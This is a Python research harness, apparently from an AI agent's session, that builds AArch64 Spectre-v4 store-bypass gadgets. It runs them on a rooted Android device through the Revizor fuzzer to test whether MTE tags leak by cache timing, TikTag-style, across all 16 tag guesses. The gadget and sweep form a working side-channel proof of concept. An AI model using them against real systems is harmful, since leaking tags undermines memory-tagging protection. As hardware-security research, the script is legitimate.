"""TikTag in a genuine Spectre-v4 (store-bypass) window -- no branch-direction training needed.
A store whose ADDRESS waits on a flushed (DRAM-miss) load is bypassed by a FAST load of the aliased
cell; the stale value steers a branch into a speculative block holding ldnum tag-checked sealed loads,
a serial orr-chain latency gate, and a fixed probe. If the MTE tag-check shrink acts in the v4 window,
the matching tag keeps the probe present while mismatches are gated. Self-inflicted single-input sweep,
pinned X3, SSB mitigation off."""
import sys, re, subprocess, os
REPO = "/home/gal_k_1_1998/revizor/sca-fuzzer"
sys.path.insert(0, REPO)
from src.config import CONF
CONF.load(os.path.join(REPO, "config_g1_x3.yml"))
from src.interfaces import Input
from src.aarch64.aarch64_executor_input_encoder import ExecutorInput
from ppadb.client import Client

OUT = "/tmp/claude-1000/-home-gal-k-1-1998-revizor-sca-fuzzer/cf5e0fed-2c4e-46af-8f5e-49fcf726976a/scratchpad"
COMPILE = os.path.join(REPO, "src/executor_userland/asm_compiler/compile_test_case.py")
PY = "/home/gal_k_1_1998/revizor/revizor-venv/bin/python"
T, READ_SET, N = 5, 32, 40
LDNUMS_GAPS = [(4, 20), (8, 40), (16, 40), (16, 80)]
DEV = "/data/local/tmp"
EU = f"{DEV}/executor_userland /dev/executor"
LOG = open(f"{OUT}/g1_v4_results.txt", "w")


def out(*a):
    s = " ".join(str(x) for x in a); print(s); LOG.write(s + "\n"); LOG.flush()


d = Client('127.0.0.1', 5037).devices()[0]


def su(c):
    return d.shell(f"su -c '{c}'")


MAIN = int(su("cat /sys/executor/print_sandbox_base").strip(), 16)


def gadget_asm(ldnum, gap):
    L = ["ldr x13, [x0]",              # warm fast bypass source (x0 cell)
         "ldr x12, [x4]",              # warm guess granule via unchecked alias
         "dc civac, x3", "dc civac, x2", "dsb sy", "isb",
         "ldr x14, [x3]",              # SLOW load (x3 flushed) -> store address not ready
         "add x7, x0, x14",            # store addr = x0 + 0 = x0 (alias), waits on slow x14
         "str xzr, [x7]",              # SLOW store
         "ldr x8, [x0]",               # FAST load bypasses the store -> stale value
         "subs xzr, x8, #0", "b.eq .Ls"]  # stale != 0 -> NE -> speculative block
    L += ["ldr x9, [x1]"] * ldnum      # tag-checked sealed loads (x1 = guess ptr, swept tag)
    L += ["orr x6, xzr, xzr"] + ["orr x2, x2, x6"] * gap  # serial latency gate on probe addr
    L += ["ldr x11, [x2]", ".Ls:"]
    return "\n".join(L) + "\n"


def build_tc(ldnum, gap):
    asm = f"{OUT}/g1_v4_{ldnum}_{gap}.asm"; binf = f"{OUT}/g1_v4_{ldnum}_{gap}.bin"
    open(asm, "w").write(gadget_asm(ldnum, gap))
    r = subprocess.run([PY, COMPILE, "--input", asm, "--output", binf], capture_output=True)
    if r.returncode:
        out(r.stderr.decode()); sys.exit(1)
    return binf


def mkinp(G):
    inp = Input(1); inp.view('uint64')[:] = 0
    g = inp[0]['gpr']
    g[0] = MAIN + 0x600; inp[0]['main'][0x600 // 8] = 1    # bypass cell, stale = 1
    g[3] = MAIN + 0xA00; inp[0]['main'][0xA00 // 8] = 0    # store-addr source (flushed) -> 0
    g[1] = (MAIN & ~(0xF << 56)) | (G << 56)               # guess ptr, swept tag (set 0)
    g[2] = MAIN + READ_SET * 64                            # probe (set 32)
    g[4] = (MAIN & ~(0xF << 56)) | (15 << 56)              # unchecked warm alias to guess granule
    t = [15] * 512; t[0] = T
    return ExecutorInput(input_=inp, mte_tags=t).serialize()


d.push(f"{OUT}/run_tag.sh", f"{DEV}/run_tag.sh"); su(f"chmod 755 {DEV}/run_tag.sh")
for G in range(16):
    open(f"{OUT}/g1_in{G}.reif", "wb").write(mkinp(G))
    d.push(f"{OUT}/g1_in{G}.reif", f"{DEV}/g1_in{G}.reif")
su(f"chmod 666 {DEV}/g1_in*.reif")
for k, v in (("measurement_mode", "F+R"), ("pin_to_core", "8"), ("warmups", "1"),
             ("enable_pre_run_flush", "1"), ("enable_phr_flush", "0"),
             ("enable_view_rotation", "0"), ("enable_ssbs", "1")):
    su(f"echo {v} > /sys/executor/{k}")

idx = 63 - READ_SET
out(f"MAIN={hex(MAIN)} T={T} read={READ_SET} reps={N} core=8 SSB=on (v4 store-bypass window)")
for ldnum, gap in LDNUMS_GAPS:
    binf = build_tc(ldnum, gap)
    d.push(binf, binf.replace(OUT, DEV)); su(f"chmod 666 {binf.replace(OUT, DEV)}")
    su(f"{EU} 1 >/dev/null; {EU} w {binf.replace(OUT, DEV)} >/dev/null")
    res = {}
    for G in range(16):
        o = su(f"sh {DEV}/run_tag.sh {DEV}/g1_in{G}.reif {N}")
        hs = re.findall(r"htrace 0:\s*([01]{64})", o)
        res[G] = (sum(int(h[idx]) for h in hs) / len(hs)) if hs else -1.0
    mm = [res[g] for g in range(16) if g != T and g != 15]
    sep = res[T] - max(mm)
    out(f"--- ldnum={ldnum} gap={gap} ---")
    out(" ".join(f"{g}:{res[g]:.2f}" for g in range(16)))
    out(f"   MATCH={res[T]:.2f} checked-mm max={max(mm):.2f} mean={sum(mm)/len(mm):.2f} sep={sep:+.2f}"
        f" {'*** v4 window DETECTS (no training) ***' if sep > 0.15 else 'no separation'}")
